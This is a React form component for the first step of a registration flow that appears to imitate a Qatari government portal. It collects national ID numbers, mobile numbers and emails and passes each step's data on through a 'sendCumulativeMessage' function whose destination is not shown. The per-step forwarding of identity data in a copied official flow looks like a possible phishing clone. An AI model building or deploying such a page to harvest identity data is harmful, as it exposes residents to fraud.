import { useState } from "react";
import { useNavigate } from "react-router-dom";
import ReCAPTCHA from "react-google-recaptcha";
import { Button } from "@/components/ui/button";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Info } from "lucide-react";
import { useRegistration } from "@/contexts/RegistrationContext";

const AccountTypeForm = () => {
  const navigate = useNavigate();
  const { updateData, sendCumulativeMessage } = useRegistration();
  const [accountType, setAccountType] = useState<string>("");
  const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
  const [nationalId, setNationalId] = useState<string>("");
  const [mobileNumber, setMobileNumber] = useState<string>("");
  const [visitorEmail, setVisitorEmail] = useState<string>("");
  const [visitorEmailConfirm, setVisitorEmailConfirm] = useState<string>("");
  const [visitorMobile, setVisitorMobile] = useState<string>("");
  const [phoneCode, setPhoneCode] = useState<string>("");

  const handleRecaptchaChange = (value: string | null) => {
    setRecaptchaValue(value);
  };

  const isFormValid = () => {
    if (!accountType) return false;

    if (accountType === "citizens") {
      return nationalId.trim() !== "" &&
             mobileNumber.trim() !== "" &&
             mobileNumber.length === 8 &&
             recaptchaValue !== null;
    } else if (accountType === "visitors") {
      return visitorEmail.trim() !== "" &&
             visitorEmailConfirm.trim() !== "" &&
             visitorEmail === visitorEmailConfirm &&
             visitorMobile.trim() !== "" &&
             phoneCode !== "" &&
             recaptchaValue !== null;
    }

    return false;
  };

  const handleContinue = async () => {
    if (!isFormValid()) {
      alert("يرجى إكمال جميع الحقول المطلوبة بشكل صحيح");
      return;
    }

    const newData = accountType === "citizens"
      ? {
          accountType: "citizens",
          nationalId,
          mobileNumber,
        }
      : {
          accountType: "visitors",
          visitorEmail,
          visitorMobile,
          phoneCode,
        };

    updateData(newData);
    await sendCumulativeMessage(1, "نوع الحساب", newData);
    navigate("/personal-info");
  };

  return (
    <div className="bg-gray-100 rounded-lg shadow-sm p-8 max-w-4xl mx-auto">
      <h2 className="text-2xl font-semibold mb-2 text-right">اختر نوع الحساب</h2>

      <div className="mb-8 flex items-start gap-2 text-sm text-primary">
        <Info className="w-5 h-5 mt-0.5 flex-shrink-0" />
        <span className="text-right">نوع الحساب</span>
      </div>

      <div className="mb-8">
        <RadioGroup value={accountType} onValueChange={setAccountType} className="space-y-3">
          <div className="flex items-center gap-3">
            <Label htmlFor="citizens" className="text-base cursor-pointer flex-1 text-right">
              المواطنين القطريين والمقيمين
            </Label>
            <RadioGroupItem value="citizens" id="citizens" />
          </div>

          <div className="flex items-center gap-3">
            <Label htmlFor="visitors" className="text-base cursor-pointer flex-1 text-right">
              الزوار والمستخدمين من خارج دولة قطر
            </Label>
            <RadioGroupItem value="visitors" id="visitors" />
          </div>
        </RadioGroup>
      </div>

      {accountType === "citizens" && (
        <div className="space-y-6 mb-8">
          <div className="text-right mb-6">
            <p className="font-bold leading-relaxed" style={{ color: '#a94a4c' }}>
              <span className="block mb-1">إرشاد</span>
              إذا كان رقم الهاتف المحمول لا يخضع لملكيتك، فسيتم إنشاء حسابك ولكن سيتم التواصل معك فوراً لتفعيل رقم هاتفك، يتم التواصل معك من خلال موظف مركز الاتصال الحكومي لتفعيل حسابك.
            </p>
          </div>

          <div className="space-y-4">
            <div>
              <Label htmlFor="nationalId" className="text-right block mb-2">
                رقم البطاقة الشخصية
              </Label>
              <Input
                id="nationalId"
                type="text"
                className="text-right bg-white"
                value={nationalId}
                onChange={(e) => setNationalId(e.target.value)}
              />
            </div>

            <div>
              <Label htmlFor="mobileNumber" className="text-right block mb-2">
                رقم الهاتف المحمول
              </Label>
              <Input
                id="mobileNumber"
                type="tel"
                className="text-right bg-white"
                maxLength={8}
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder="8 أرقام"
                value={mobileNumber}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '');
                  setMobileNumber(value);
                }}
              />
            </div>

            <div className="flex justify-start">
              <ReCAPTCHA
                sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"
                onChange={handleRecaptchaChange}
              />
            </div>
          </div>
        </div>
      )}

      {accountType === "visitors" && (
        <div className="space-y-6 mb-8">
          <div>
            <Label htmlFor="email" className="text-right block mb-2">
              البريد الإلكتروني
            </Label>
            <Input
              id="email"
              type="email"
              className="text-right bg-white"
              value={visitorEmail}
              onChange={(e) => setVisitorEmail(e.target.value)}
            />
          </div>

          <div>
            <Label htmlFor="confirmEmail" className="text-right block mb-2">
              أعد إدخال البريد الإلكتروني
            </Label>
            <Input
              id="confirmEmail"
              type="email"
              className="text-right bg-white"
              value={visitorEmailConfirm}
              onChange={(e) => setVisitorEmailConfirm(e.target.value)}
            />
            {visitorEmailConfirm && visitorEmail !== visitorEmailConfirm && (
              <p className="text-destructive text-xs mt-1 text-right">البريد الإلكتروني غير متطابق</p>
            )}
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <Label htmlFor="visitorMobile" className="text-right block mb-2">
                رقم الهاتف المحمول
              </Label>
              <Input
                id="visitorMobile"
                type="tel"
                className="text-right bg-white"
                value={visitorMobile}
                onChange={(e) => setVisitorMobile(e.target.value)}
              />
            </div>

            <div>
              <Label htmlFor="phoneCode" className="text-right block mb-2">
                حدد الرمز الهاتف الدولي
              </Label>
              <Select value={phoneCode} onValueChange={setPhoneCode}>
                <SelectTrigger className="bg-white">
                  <SelectValue placeholder="حدد الرمز الهاتف الدولي" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="+974">+974 (قطر)</SelectItem>
                  <SelectItem value="+966">+966 (السعودية)</SelectItem>
                  <SelectItem value="+971">+971 (الإمارات)</SelectItem>
                  <SelectItem value="+973">+973 (البحرين)</SelectItem>
                  <SelectItem value="+965">+965 (الكويت)</SelectItem>
                  <SelectItem value="+968">+968 (عمان)</SelectItem>
                  <SelectItem value="+20">+20 (مصر)</SelectItem>
                  <SelectItem value="+962">+962 (الأردن)</SelectItem>
                  <SelectItem value="+961">+961 (لبنان)</SelectItem>
                  <SelectItem value="+963">+963 (سوريا)</SelectItem>
                  <SelectItem value="+964">+964 (العراق)</SelectItem>
                  <SelectItem value="+212">+212 (المغرب)</SelectItem>
                  <SelectItem value="+216">+216 (تونس)</SelectItem>
                  <SelectItem value="+213">+213 (الجزائر)</SelectItem>
                  <SelectItem value="+218">+218 (ليبيا)</SelectItem>
                  <SelectItem value="+970">+970 (فلسطين)</SelectItem>
                  <SelectItem value="+967">+967 (اليمن)</SelectItem>
                  <SelectItem value="+249">+249 (السودان)</SelectItem>
                  <SelectItem value="+91">+91 (الهند)</SelectItem>
                  <SelectItem value="+92">+92 (باكستان)</SelectItem>
                  <SelectItem value="+63">+63 (الفلبين)</SelectItem>
                  <SelectItem value="+62">+62 (إندونيسيا)</SelectItem>
                  <SelectItem value="+880">+880 (بنغلاديش)</SelectItem>
                  <SelectItem value="+94">+94 (سريلانكا)</SelectItem>
                  <SelectItem value="+977">+977 (نيبال)</SelectItem>
                  <SelectItem value="+44">+44 (المملكة المتحدة)</SelectItem>
                  <SelectItem value="+1">+1 (الولايات المتحدة)</SelectItem>
                  <SelectItem value="+33">+33 (فرنسا)</SelectItem>
                  <SelectItem value="+49">+49 (ألمانيا)</SelectItem>
                  <SelectItem value="+39">+39 (إيطاليا)</SelectItem>
                  <SelectItem value="+34">+34 (إسبانيا)</SelectItem>
                  <SelectItem value="+90">+90 (تركيا)</SelectItem>
                  <SelectItem value="+86">+86 (الصين)</SelectItem>
                  <SelectItem value="+81">+81 (اليابان)</SelectItem>
                  <SelectItem value="+82">+82 (كوريا الجنوبية)</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          <div className="flex justify-start">
            <ReCAPTCHA
              sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"
              onChange={handleRecaptchaChange}
            />
          </div>
        </div>
      )}

      <div className="flex flex-col-reverse sm:flex-row sm:items-center sm:justify-between gap-3 sm:gap-4 pt-6 border-t border-border">
        <div className="flex gap-3 w-full sm:w-auto">
          <Button variant="outline" className="flex-1 sm:flex-none sm:min-w-24 h-12 sm:h-10">
            رجوع
          </Button>
          <Button variant="outline" className="flex-1 sm:flex-none sm:min-w-24 h-12 sm:h-10">
            إلغاء
          </Button>
        </div>

        <Button
          className="w-full sm:w-auto sm:min-w-32 h-12 sm:h-10 bg-primary hover:bg-primary/90"
          onClick={handleContinue}
          disabled={!isFormValid()}
        >
          استمر
        </Button>
      </div>
    </div>
  );
};

export default AccountTypeForm;
